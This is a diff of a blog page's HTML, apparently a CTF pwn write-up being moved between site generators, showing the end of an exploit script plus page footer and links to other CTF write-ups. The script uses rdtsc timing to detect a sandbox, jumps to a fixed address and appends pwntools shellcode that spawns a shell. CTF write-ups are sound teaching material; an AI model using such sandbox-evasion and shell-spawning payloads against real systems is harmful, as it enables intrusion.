+        &quot;rdtsc\n&quot;
+        &quot;mov r8, rax\n&quot;
+        &quot;shl rdx, 32\n&quot;
+        &quot;or r8, rdx\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;nop\n&quot;
+        &quot;rdtsc\n&quot;
+        &quot;mov r9, rax\n&quot;
+        &quot;shl rdx, 32\n&quot;
+        &quot;or r9, rdx\n&quot;
         
-        <span class="s2">&#34;sub r9, r8</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;cmp r9, 0x100</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;jg sandbox</span><span class="se">\n</span><span class="s2">&#34;</span>
+        &quot;sub r9, r8\n&quot;
+        &quot;cmp r9, 0x100\n&quot;
+        &quot;jg sandbox\n&quot;
         
-        <span class="s2">&#34;mov rax, 0x100006a</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;jmp rax</span><span class="se">\n</span><span class="s2">&#34;</span>
+        &quot;mov rax, 0x100006a\n&quot;
+        &quot;jmp rax\n&quot;
 
-        <span class="s2">&#34;sandbox:</span><span class="se">\n</span><span class="s2">&#34;</span>
-        <span class="s2">&#34;hlt</span><span class="se">\n</span><span class="s2">&#34;</span>
-    <span class="p">)</span>
+        &quot;sandbox:\n&quot;
+        &quot;hlt\n&quot;
+    )
 
-    <span class="n">map_stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rsp, 0x1000000</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-    <span class="n">map_stack</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;add rsp, 0x500</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+    map_stack = pwn.asm(&quot;mov rsp, 0x1000000\n&quot;)
+    map_stack += pwn.asm(&quot;add rsp, 0x500\n&quot;)
     
-    <span class="n">shell</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+    shell = pwn.asm(pwn.shellcraft.amd64.linux.sh())
 
-    <span class="nb">print</span><span class="p">(</span><span class="n">shellcode</span> <span class="o">+</span> <span class="n">map_stack</span> <span class="o">+</span> <span class="n">shell</span><span class="p">)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">shellcode</span> <span class="o">+</span> <span class="n">map_stack</span> <span class="o">+</span> <span class="n">shell</span><span class="p">))</span>
-    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shellcode</span> <span class="o">+</span> <span class="n">map_stack</span> <span class="o">+</span> <span class="n">shell</span><span class="p">)</span>
-
-
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-    <span class="n">exp</span><span class="p">()</span>
-</code></pre></div>
-    </section>
-  </article>
-
-      </main>
-
-      <footer class="gblog-footer">
-  <nav class="container flex">
-    <div>
-      <section class="flex flex-wrap align-center">
-        
-          <span class="gblog-footer__item gblog-footer__item--row">
-            <svg class="icon gblog_rss_feed"><use xlink:href="#gblog_rss_feed"></use></svg>
-            <a href="/feed.xml" class="gblog-footer__link">Atom Feed</a>
-          </span>
-        
-        
-          
-
-  
-  
-  
-
-  
-    
-      
-      
-      
-
-      
-        <span class="gblog-footer__item gblog-footer__item--row">
-          
-            <svg class="icon gblog_email"><use xlink:href="#gblog_email"></use></svg>
-          
-          <a
-            href="
-              /
-            "
-            class="gblog-footer__link"
-          >
-            Contact
-          </a>
-        </span>
-      
-    
-  
+    print(shellcode + map_stack + shell)
+    print(base64.b64encode(shellcode + map_stack + shell))
+    f.write(shellcode + map_stack + shell)
 
 
-
-
-
+if __name__ == &quot;__main__&quot;:
+    exp()
+</code></pre>
 
         
-        
-        
-      </section>
-      <section class="flex flex-wrap align-center">
-        <span class="gblog-footer__item">
-          Built with <a href="https://gohugo.io/" class="gblog-footer__link">Hugo</a> and
-          <svg class="icon gblog_heart"><use xlink:href="#gblog_heart"></use></svg>
-        </span>
-      </section>
-      
-      
-        <section class="flex flex-wrap align-center">
-          <span class="gblog-footer__item">
-            Content licensed under
-            <a href="https://spdx.org/licenses/Beerware.html" class="gblog-footer__link no-wrap">Beerware license</a>
-          </span>
-        </section>
-      
+      </div>
+
+         
     </div>
     
-      <div class="flex flex-25 justify-end">
-        <span class="gblog-footer__item text-right">
-          <a class="gblog-footer__link fake-link" href="#" aria-label="Back to top">
-            <svg class="icon gblog_keyborad_arrow_up">
-              <use xlink:href="#gblog_keyborad_arrow_up"></use>
-            </svg>
-            <span class="hidden-mobile">Back to top</span>
-          </a>
-        </span>
-      </div>
+     
+  </div>
+  
     
-  </nav>
+<nav id="article-nav">
+  <a class="article-nav-btn left "
+    
+      href="/posts/writemeabook/"
+      title="[Grey Cat CTF Quals 2023 - pwn] Write me a Book"
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+      
+        [Grey Cat CTF Quals 2023 - pwn] Write me a Book
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/posts/chip8/"
+      title="[pwnme 2023 - pwn] chip8"
+     >
+
+    <p class="title-text">
+      
+        [pwnme 2023 - pwn] chip8
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+ 
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2023 nasm<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
 </footer>
 
     </div>
-  </body>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
+        <span class="material-symbols-rounded">keyboard_arrow_up</span>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.style.opacity = 1;
+        } else {
+            btn.style.opacity = 0;
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
 </html>
